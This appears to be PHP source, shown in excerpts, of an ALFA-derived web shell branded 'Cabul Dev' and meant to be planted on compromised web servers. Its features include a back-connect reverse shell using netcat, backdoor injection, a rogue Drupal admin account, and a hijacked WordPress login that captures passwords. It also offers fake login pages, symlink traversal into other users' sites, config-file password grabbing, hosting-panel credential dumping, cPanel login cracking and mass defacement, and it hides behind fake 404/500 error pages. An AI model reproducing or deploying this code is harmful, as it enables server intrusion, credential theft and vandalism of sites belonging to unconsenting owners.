...
<?php
/*
        Author:         Leviathan Perfect Hunter
        Telegram:       https://t.me/anubrogini
        Gmail:          parapencarijandamuda@gmail.com
*/
...
define("__ALFA_CODE_NAME__", "Cabul Dev");
define("__ALFA_DATA_FOLDER__", "Cabul Dev");
...
$GLOBALS['__ALFA_COLOR__'] = array(
                ...
                "main_size" => "#00b531",
                "main_modify" => "#ffe204",
                "main_owner_group" => "#00b531",
                "main_green_perm" => "#ffe204",
                "main_purple_perm" => "#800080",
                "main_white_perm" => "#00b531",
                "beetween_perms" => "#800080",
                "main_actions" => array(
                        "key_color" => "#800080",
                        "multi_selector" => array(
...
<title>~ Cabul Dev Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="Cabul Dev 2012" draggable="false" src="https://i.ibb.co/tTqnJ426/download-2.jpg" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ Cabul Dev Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
...
echo '<html><head><title>500 Internal Server Error</title></head><body><h1>Internal Server Error</h1><p>The server encountepurple an internal error or misconfiguration and was unable to complete your request.</p><p>Please contact the server administrator, '.$_SERVER['SERVER_ADMIN'].' and inform them of the time the error occurpurple, and anything you might have done that may have caused the error.</p><p>More information about this error may be available in the server error log.</p><hr>'.$SERVER_SIG.'</body></html>'.$Eform;
exit;
}
...
echo "<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.<br><br>Additionally, a 404 Not Found error was encountepurple while trying to use an ErrorDocument to handle the request.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
exit;
}
}
}
...
if(isset($_GET["bypass123"])){
@error_reporting(E_ALL ^ E_NOTICE);
echo '<html>';
echo "<title>anjay cabul</title>";
echo "<body bgcolor=#000000>";
echo '<b><big><font color=#7CFC00>Kernel : </font><font color="#FFFFF">'.(function_exists('php_uname')?php_uname():'???').'</font></b></big>';
$safe_mode = @ini_get('safe_mode');
if($safe_mode){$r = "<b style='color: purple'>On</b>";}else{$r = "<b style='color: green'>Off</b>";}
...
echo "PWD:<font color=#00b531> " . str_replace("\\","/",@alfaGetCwd()) . "/<br />";
...
.ajaxarea{display:none;border:1px solid #800080;color:#00b531}.up_bar{margin-bottom: 2px;transition:width 2s;background-color:purple;width:0;height:8px;display:none;}#hidden_sh{background-color:#800080;text-align:center;position:absolute;right:0;left:90%;border-bottom-left-radius:2em}.alert_green{color:#0F0;font-family:"Comic Sans MS";font-size:small;text-decoration:none}.whole{background-color:#000;background-image:url(https://i.ibb.co/tTqnJ426/download-2.jpg);background-position:center;background-attachment:fixed;background-repeat:no-repeat}.header{height:auto;width:auto;border:7px solid #800080;color:'.alfa_getColor("header_values").';font-size:12px;font-family:Verdana,Geneva,sans-serif}.header a{text-decoration:none;}.filestools a{color:#0F0;text-decoration:none}.filestools a:hover{color:#FFF;text-decoration:none;}span{font-weight:bolder;color:#FFF}.txtfont{font-family:"Comic Sans MS";font-size:small;color:#fff;display:inline-block}.txtfont_header{font-family:"Comic Sans MS";font-size:large;display:inline-block;color:#800080}.tbltxt{font-family:"Comic Sans MS";color:#fff;font-size:small;display:inline-block}input[type="file"]{display:none}.inputfile{border:1px solid #800080;background:transparent;box-shadow:0 0 4px #800080;border-radius:4px;height:20px;width:250px;text-overflow:ellipsis;white-space:nowrap;cursor:pointer;display:inline-block;overflow:hidden}.inputfile:hover{box-shadow:0 0 4px #800080;border:1px solid #800080;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}.inputfile span,.inputfile strong{padding:2px;padding-left:10px}.inputfile span{color:#800080;width:90px;min-height:2em;display:inline-block;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;vertical-align:top;float:left}.inputfile strong{background-image:url('.__showicon('alfamini').');background-repeat:no-repeat;background-position:float;height:100%;width:109px;color:#fff;background-color:#800080;display:inline-block;float:right}.inputfile:focus strong,.inputfile.has-focus strong,.inputfile:hover strong{background-color:#46647A}.button{padding:3px}#addup,.button{outline:none;cursor:pointer;border:1px solid #800080;background:transparent;box-shadow:0 0 4px #800080;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px;background-color:#000;color:green;border-radius:100px}#addup:hover,.button:hover{box-shadow:0 0 4px #800080;border:1px solid #800080;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:disabled:hover{cursor:not-allowed}td{padding:'.($GLOBALS['DB_NAME']['show_icons']=='1'?'0':'1').'px}.myCheckbox{padding-left:2px}.myCheckbox label{display:inline-block;cursor:pointer;position:relative}.myCheckbox input[type=checkbox]{display:none}.myCheckbox label:before{content:"";display:inline-block;width:14px;height:13px;position:absolute;background-color:#aaa;box-shadow:inset 0 2px 3px 0 rgba(0,0,0,.3),0 1px 0 0 rgba(255,255,255,.8)}.myCheckbox label{margin-bottom:15px;padding-right:17px}.myCheckbox label:before{border-radius:100px}input[type=checkbox]:checked + label:before{content:"";background-color:#800080;background-image:url('.__showicon('alfamini').');background-repeat:no-repeat;background-position:50% 50%;background-size:14px 14px;box-shadow:0 0 4px #0F0}#meunlist{font-family:Verdana,Geneva,sans-serif;color:#FFF;width:auto;border-right-width:7px;border-left-width:7px;height:auto;font-size:12px;font-weight:700;border-top-width:0;border-color:#800080;border-style:solid}.whole #meunlist ul{text-align:center;list-style-type:none;margin:0;padding:5px 5px 7px 2px}.whole #meunlist li{margin:0;padding:0;display:inline}.whole #meunlist a{font-family:arial,sans-serif;font-size:14px;text-decoration:none;font-weight:700;clear:both;width:100px;margin-right:-6px;border-right-width:1px;border-right-style:solid;border-right-color:#FFF;padding:3px 15px}.foot{font-family:Verdana,Geneva,sans-serif;margin:0;padding:0;width:100%;text-align:center;font-size:12px;color:#800080;border-right-width:7px;border-left-width:7px;border-bottom-width:7px;border-bottom-style:solid;border-right-style:solid;border-right-style:solid;border-left-style:solid;border-color:#800080}#text{text-align:center}input[type=submit]{cursor:pointer;background-image:url('.__showicon('btn').');background-repeat:no-repeat;background-position:50% 50%;background-size:23px 23px;background-color:#000;width:30px;height:30px;border:1px solid #800080;border-radius:100px}textarea{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #800080;background:transparent;box-shadow:0 0 4px #800080;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}textarea:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #800080;border:1px solid #800080;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text],input[type=number],.alfa_custom_cmd_btn{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #800080;background:transparent;box-shadow:0 0 4px #800080;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}input[type=submit]:hover{color:#000;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #800080;border:2px solid #800080;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #800080;border:1px solid #800080;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}select{padding:3px;width:162px;color:#FFE;text-shadow:#000 0 2px 7px;border:1px solid #800080;background:#000;text-decoration:none;box-shadow:0 0 4px #800080;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}select:hover{border:1px solid #800080;box-shadow:0 0 4px #800080;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#007700 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}
.foottable{width: 300px;font-weight: bold;'.(!@is_writable($GLOBALS['cwd'])?'}.dir{background-color:purple;}':'}').'.main th{text-align:left;}.main a{color: #FFF;}.main tr:hover{background-color:#646464 !important;}.ml1{ border:1px solid #800080;padding:5px;margin:0;overflow: auto; }.bigarea{ width:99%; height:300px; }.alfa_custom_cmd_btn {padding: 5px;color: #ffe204;cursor: pointer;}.ajaxarea.filesman-active-content {display: block;}'.alfaCssLoadColors().'
</style>';
...
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?solevisible"><span style="color:#ffe204;">'.__ALFA_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__ALFA_VERSION__.'</span></small></a></div>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="Cabul Dev 2012" draggable="false" src="https://i.ibb.co/tTqnJ426/download-2.jpg" /></td>
</tr>
<tr>
...
function __showicon($r){
        $s['btn']='https://falconstorage.wordpress.com/wp-content/uploads/2025/03/dir.png';
        $s['alfamini']='https://i.ibb.co/tTqnJ426/download-2.jpg';
        $s['loader']='https://png.pngtree.com/png-vector/20231001/ourlarge/pngtree-womens-panties-with-a-pattern-undergarment-png-image_10099615.png';
...
$error = '<font color="purple">Error In Inject BackDoor...!<br>File Loader is not Writable Or Not Exists...!</font>';
$success= '<font color="green">Success...!';
$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('Cabul Dev is Here...!');\n?></textarea></p></div>";
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='alfa'>Cabul Dev Uploader</option><option value='my'>My Private Shell</option></select>";
...
echo('<font color="purple">Error...!</font>');
}
echo('</center>');
}
echo("</div>");
...
echo '';
echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#00b531">Protect:</div></td><td><select name="protect" style="width:100%;">'.$protect_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#00b531">Cgi Api:</div></td><td><select name="cgi_api" style="width:100%;">'.$cgiapi_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#00b531">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$postEnc_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#00b531">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$icon_html.'</select></td></tr><tr><tr><td><div class="tbltxt" style="color:#00b531">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$login_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#00b531">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['alfa3'])?$GLOBALS['DB_NAME']['user']:$_POST['alfa3']).'" placeholder="solevisible"></td></tr><tr><td><div class="tbltxt" style="color:#00b531">Password:</div></td><td><input type="text" style="width:95%;" name="password" placeholder="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
if($_POST['alfa5']=='>>'){
echo __pre();
...
__alert("<span style='color:purple;'>File has no edit access...!</span>");
}
}else{
__alert("<span style='color:purple;'>UserName is Empty !</span>");
}
}
...
if(empty($about_us)){
$about_us = "<pre><center><img src='https://i.ibb.co/tTqnJ426/download-2.jpg'><br>
<b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
<font color='#00A220'>Shell Coded By Cabul Dev (Cabul Dev)</font><br>
<font color='#00A220'>Contact : parapencarijandamuda@gmail.com</font><br>
<font color='#00A220'>Telegram Channel: @solevisible</font><br>
<font color='#800080'>Persian Gulf For Ever</font><br>
<font color='#800080'>Iranian Programmers</font><br>
...
if(!empty($dbname)){
echo __pre();
$msg = "<center>Check this :  <font color='purple'>".$dfile."</font></center>";
...
if ($curl_errno > 0) {echo "<font color='purple'>Error: $curl_error</font><br>";}
elseif(preg_match('/CMD_FILE_MANAGER|frameset/i',$result)){
echo 'UserName: <font color="purple">'.$info['username'].'</font> PassWord: <font color="purple">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
$info['target'] = $url;
CrackerResualt($info);
}
curl_close($curl);
...
echo '<br><font color="purple">Attack Finished...</font>';
}
echo '</div>';
alfafooter();
}
function output($string){ echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color=purple><a target='_blank' href='".$string."'>Click Here !</a></font></b></center><br><br>";}
...
output($ff);}else{
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#00b531\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#00b531'> And Reset Password With Email</font> => <font color=purple>solevisible@fbi.gov</font><br/><font color='#00b531'>And Go To => </font><a href='".$path."/solevisible.php' target='_blank'>".$path."/solevisible.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
...
echo "<br><pre id='strOutput' style='margin-top:5px' class='ml1'><br><center><b><font color='#00b531'>Please Go To Target => </font><a href='".$ff."' target='_blank'>".$ff."</a><br/><font color='#00b531'>And Go To => </font><a href='".$fff."' target='_blank'>".$fff."</a></b></center><br><br>";
}}}}
...
$fff = 'http://'.$realurl.$realpath."/solevisible.php";
echo "<center><p><font color=\"#00b531\">First Open This Link => </font><a href='".$ff."' target='_blank'>".$ff."</a><br/><font color=\"#00b531\">Second Open This Link => </font><a href='".$fff."' target='_blank'>".$fff."</a></center></p>";}}}
echo '</div>';
alfafooter();
}
...
$email = "parapencarijandamuda@gmail.com";
...
echo __pre().'<center>';
switch($resp){
        case('CODE ERREUR : 001'):echo "<b><font color='purple'>You exceeded the 400 allowed request per day</font></b>";break;
        case('CODE ERREUR : 003'):echo "<b><font color='purple'>Your request includes more than 400 hashes.</font></b>";break;
        case('CODE ERREUR : 004'):echo "<b><font color='purple'>The type of hash you provide in the argument hash_type doesn't seem to be valid</font></b>";break;
        case('CODE ERREUR : 005'):echo "<b><font color='purple'>The hash you provide doesn't seem to match with the type of hash you set.</font></b>";break;
}
if(substr($resp,0,4)!='CODE'&&$resp!=''){
echo "<b>Result: <font color='green'>".$resp."</font></b>";
}elseif(substr($resp,0,4)!='CODE'){
echo "<font color='purple'>NoT Found</font><br />";
}
echo('</center>');
}
}
...
if(preg_match('#<fieldset class="trouve">(.*?)</fieldset>#',$resp,$s)){
        ...
        echo('<font color="purple">Not Found...!</font>');
}
echo('</center><br>');
}
}
...
<tr>
<td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><span class='footer_text'>Execute :</span><br><button onClick='alfaOpenPhpTerminal();return false;' class='foottable alfa_custom_cmd_btn'><img style='width:28px;vertical-align: middle;' src='https://falconstorage.wordpress.com/wp-content/uploads/2025/03/terminal.png'> Terminal</button><br></form></td>
</tr>
<tr>
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./CabulDev&copy; 2020-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>parapencarijandamuda[at]gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://t.me/anubrogini'>@anubrogini</a></span></div></td>
</tr>
</table>
</div>
...
<div id='rightclick_menu'>
  ...
  <a href='javascript:void(0);' name='delete'><img src=\"https://falconstorage.wordpress.com/wp-content/uploads/2025/03/deleted.png\"> Delete</a>
</div>
...
echo '<div><div class="filters-holder"><span>Filter: </span><input style="color:#800080;" autocomplete="off" type="text" id="regex-filter" name="name-filter" onkeydown="doFilterName(this);"><span style="margin-left:10px">Sort By: </span><select name="sort_files" onchange="sortBySelectedValue(this,\'alfa_sort_by\');" style="color:#800080;"><option value="name" '.($alfa_sort_by == 'name'?'selected':'').'>Name</option><option value="size" '.($alfa_sort_by == 'size'?'selected':'').'>Size</option><option value="modify" '.($alfa_sort_by == 'modify'?'selected':'').'>Modify</option></select><span style="margin-left:10px">Direction: </span><select name="direction_filesman" onChange="sortBySelectedValue(this,\'alfa_filesman_direction\')" style="color:#800080;"><option value="asc" '.($alfa_filesman_direction == 'asc'?'selected':'').'>Ascending</option><option value="desc" '.($alfa_filesman_direction == 'desc'?'selected':'').'>Descending</option></select><span style="margin-left:10px;"> limit: </span><input style="text-align:center;width: 40px;color:#800080;" type="text" name="limited_number" value="'.$alfa_limited_files.'" oninput="this.value=this.value.replace(/[^0-9]/g,\'\');setCookie(\'alfa_limited_files\', this.value, 2012);"><span style="margin-left:10px;">Files Count: <b style="color:#800080;">'.($count_dirContent-1).'</b></span></div><div class="header">';
if($dirContent == false){
echo '<center><br><span style="font-size:16px;"><span style="color: purple; -webkit-text-shadow: 1px 1px 13px;"><strong><b><big>!!! Access Denied !!!</b></big><br><br></strong></div>';
alfaFooter();
return;
}
global $sort;
...
if(!@chdir($_POST['c'])){
        ...
        if($alfa_canruncmd){
                ...
                $perm_color_class = alfaEx("if [[ -w '".$slashed_alfa1."' ]]; then echo main_green_perm; elif [[ -r '".$slashed_alfa1."' ]]; then echo main_white_perm; else echo main_purple_perm; fi");
        }
}
if($_POST['alfa2'] == 'auto'){
...
echo __pre()."<center><p><div class=\"txtfont\"><font color='purple'>!...FILE DOEST NOT EXITS...!</font></div></p></center></div><script>editor_error=false;removeHistory('".$_POST['alfa4']."');</script>";
alfaFooter();
return;
}
if($chdir_fals){
...
$disabled_btn_style= 'background: #800080;color: #fff;';
}
if(!empty($_POST['alfa3'])){
...
echo '<font color="#00b531"><b>Can\'t set permissions!</b></font><br><script>document.mf.alfa3.value="";</script>';}
}else{echo('Success!');}
}
clearstatcache();
...
if($type!='file'){
return ($file=='..'?$s.'back.png':$a.'VJ7L07J/pink-xopixel-folder-99392.webp');
}else{
$ext = explode('.',$file);
$ext = end($ext);
$ext = strtolower($ext);
...
<textarea name=index rows='19' cols='103'><title>Hacked By Cabul Dev</title><b>Hacked By Cabul Dev</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
$s0levisible="Powepurple By Solevisible";
$dbu = $_POST['alfa6'];
$path = $_POST['alfa5'];
$fname = $_POST['alfa4'];
$dbn = $_POST['alfa7'];
...
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color=purple><a target='_blank' href='".$path."/".$fname."'>Click Here !</a></font></b></center><br><br>";
}else{
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#00b531\">Please go to Target </font><font color=purple>\" ".$path."/pwreset.php \"</font><br/><font color=\"#00b531\"> and reset password with email</font> => <font color=purple>solevisible@fbi.gov</font><br/><font color=\"#00b531\">and go to</font> <font color=purple>\" ".$path."/".$fname." \"</font></b></center><br><br>";
}}}}
...
<title>Hacked By Cabul Dev</title><b>Hacked By Cabul Dev</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
echo __pre()."<center><table border='1'><tr><td><b><font color=\"#00b531\">User: </b></font></td><td><b><font color=\"#800080\">{$user}</font></b></td></tr><tr><td><b><font color=\"#00b531\">site: </b></font></td><td><b><font color=\"#800080\">{$rep}</font></b></td></tr></table></center>";
...
<tr><td><b><font color=\"#00b531\">User: </b></font></td><td><b><font color=\"#800080\">".trim($ex[1])."</font></b></td></tr>
<tr><td><b><font color=\"#00b531\">site: </b></font></td><td><b><font color=\"#800080\">{$rep}</font></b></td></tr></table></center>";break;}}}}}
...
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Cabul Dev(Cabul Dev)");
...
$err = "<font color='purple'>[ Failed...! ]</font>";
...
echo "</select> <div id='bcipAction' style='display:inline-block;'><div class=\"txtfont\">IP:</div> <input type='text' style='text-align:center;' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'></div> <div class=\"txtfont\">Port: </div> <input type='text' size='5' style='text-align:center;' name='port' value='2012'> <input type='submit' value=' '></form><p><div id='bcStatus'><small>Run ` <font color='purple'>nc -l -v -p port</font> ` on your computer and press ` <font color='purple'>>></font> ` button</small></div></p></center></b></font><br>";
...
echo("<pre class=ml1 style='margin-top:5px'><font color='purple'><center>[ Failed...! ]</center></font></pre>");
}
}
if($lang=='java'||$lang=='c'){
...
<input type="text" name="defacer" size="67" id="text" placeholder="Cabul Dev 2012" />
<br>
...
$site = $_POST['alfa4'];
if(empty($hacker)){
die (__pre()."<center><b><font color =\"#800080\">[+] YOU MUST FILL THE ATTACKER NAME [+]</font></b></center>");
}elseif($method == "------------------------------------SELECT-------------------------------------"){
die(__pre()."<center><b><font color =\"#800080\">[+] YOU MUST SELECT THE METHOD [+]</b></font></center>");
}elseif($neden == "------------------------------------SELECT-------------------------------------"){
die(__pre()."<center><b><font color =\"#800080\">[+] YOU MUST SELECT THE REASON [+]</b></font></center>");
}elseif(empty($site)){
die(__pre()."<center><b><font color =\"#800080\">[+] YOU MUST INTER THE SITES LIST [+]<font></b></center>");
}
$i = 0;
$sites = explode("\n", $site);
$alfa = new AlfaCURL();
...
$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','solevisible@fbi.gov','filtepurple_html','1','Europe/Berlin','solevisible@fbi.gov')") or die(mysqli_error($conn));
...
}else{echo "<center><pre class=ml1 style='margin-top:5px'><b><font color=\"#00b531\">[+] Symlink Function Disabled !</b></font></pre></center>";}
}
...
$table_header = "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><table id='tbl_sympphp' align='center' width='40%' class='main' border='1'><td><span style='color:#FFFF01;'><b>*</span></b></td><td><span style='color:#00A220;'><b>Domains</span></b></td><td><span style='color:#00b531;'><b>Users</span></b></td><td><span style='color:#800080;'><b>symlink</span></b></td>";
...
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#00b531;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__ALFA_DATA_FOLDER__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#800080;">Symlink</span></a></td></tr>';
...
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#00b531;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__ALFA_DATA_FOLDER__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#800080;">Symlink</span></a></td></tr>';
if($sole){
...
$cant_symlink = false;
        ...
        echo "<pre class=ml1 style='margin-top:5px'><b><font color=\"#00b531\">[+] Symlink Function Disabled !</b></font></pre></center>";
        $cant_symlink = false;
}
if($cant_symlink)echo '<pre id="strOutput" style="margin-top:5px" class="ml1"><br><font color="#00b531">Error...</font></b><br>';
echo "</center></table>";
}
echo "</div>";
alfafooter();
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://i.ibb.co/tTqnJ426/download-2.jpg\"></p>";
...
echo("<tr><td><b><font color=\"#00b531\">Type</font></td><td>$type</td></tr></b>");
echo("<tr><td><b><font color=\"#00b531\">Active</font></td><td>$active</td></tr></b>");
echo("<tr><td><b><font color=\"#00b531\">Hostname</font></td><td>$hostname</td></tr></b>");
echo("<tr><td><b><font color=\"#00b531\">Ip</font></td><td>$ipaddress</td></tr></b>");
echo("<tr><td><b><font color=\"#00b531\">Username</font></td><td>$username</td></tr></b>");
echo("<tr><td><b><font color=\"#00b531\">Password</font></td><td>$password</td></tr></b>");
...
echo("<center><table border='1'>");
echo("<tr><td><b><font color=\"#00b531\">Register</font></td><td>$registrar</td></tr></b>");
echo("<tr><td><b><font color=\"#00b531\">Setting</font></td><td>$setting</td></tr></b>");
echo("<tr><td><b><font color=\"#00b531\">Value</font></td><td>$value</td></tr></b>");
echo "</table><br><br></center>";
}
}
}else{__alert('<font color="purple">tblservers is Empty...!</font>');};
}
echo "</div>";
alfafooter();
}
...
echo "<b><font color=\"#00b531\">[+] Founded ".$x." readable ".str_replace("{user}", "*", $makepwd)." directories\n"."<br /></font></b>";
echo "<b><font color=\"#800080\">[~] Searching for passwords in config files...\n\n"."<br /><br /><br /></font></b>";
foreach($users as $user){
if(empty($user))continue;
$path = str_replace("{user}", $user, $makepwd);
echo "<form method=post onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span><font color=#800080>Change Dir <font color=#FFFF01>..:: </font><font color=purple><b>$user</b></font><font color=#FFFF01> ::..</font></font></span><br><input class='foottable' type=text name=c value='$path'><input type=submit value='>>'></form><br>";
}
}else{echo('<b> <center><font color="#00b531">[-] Error : coudn`t read /etc/passwd [-]</font></center></b>');}
echo '<br><br></b>';
echo '</div>';
alfafooter();
}
...
}else{echo __pre().'<center><p><font color="purple">ERROR!!!...</font></p></center>';}
}
}
echo '</div>';
alfafooter();
...
$purpleirect_wp = '#if[ ]{0,}\([ ]{0,}![ ]{0,}is_wp_error\([ ]{0,}\$user[ ]{0,}\)[ ]{0,}&&[ ]{0,}![ ]{0,}\$reauth[ ]{0,}\)[ ]{0,}{#';
$code=str_replace('{saveto_path}',$saveto,$code);
$login=$path."/wp-login.php";
if(@is_file($login) AND @is_writable($login)){
$data_login = @file_get_contents($login);
if(@preg_match($purpleirect_wp, $data_login, $match)){
$evil_login = "\t".$match[0]."\n\t".$code;
$login_replace = @preg_replace($purpleirect_wp,$evil_login, $data_login);
@file_put_contents($login, $login_replace);
hijackOutput(0,$saveto);
}else{
hijackOutput(1);
...
function hijackOutput($c=0,$p=''){echo($c==0?"<center><font color='green'>Success</font> --> path: $p</center>":'<center><font color="purple">Error in inject code !</font></center>');}
...
function alfafakepage(){
        ...
        if(!empty($clone_page) && !empty($fake_root) && !empty($logto) && !empty($inject_to) && !empty($bind_on) && $_POST['alfa3'] == '>>'){
                ...
                if(!empty($source_page)){
                        ...
                        echo("<div style='text-align:center;color:purple;'>Cannot open the target...!</div>");
                }
        }
        echo '</div>';
        alfafooter();
...
function alfaconfig_grabber(){
        ...
        Ext: <small><font color="purple">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
        <input type="submit" name="btn" value=" "></div></form></center><br>';
        $dir = $_POST['alfa2'];
        $ext = $_POST['alfa3'];
        if($_POST['alfa5']=='>>'){
...
closedir($dh);
}else{__alert('<font color="purple">Error In OpenDir...</font>');}
}else{__alert('<font color="purple">DefPage File NotFound...</font>');}
}else{__alert('<font color="purple">Directory is not Readable...</font>');}
}else{__alert('<font color="purple">Mass Dir is Invalid Dir...</font>');}
}else{__alert('<font color="purple">Dir is Empty...</font>');}
}
echo '</div>';
alfafooter();
}
...
echo @is_file($dir)?$dir."<b><font color='purple'>DeFaced...</b></font><br>" : '';
}
}elseif($m=='all'){
@file_put_contents($dir,$defpage);
echo @is_file($dir)?$dir."  <b><font color='purple'>DeFaced...</b></font><br>" : '';
...
function convertBash($code) {
    $dictionary = array(
        ...
        '[01;31m' => '<span style="color:purple">',
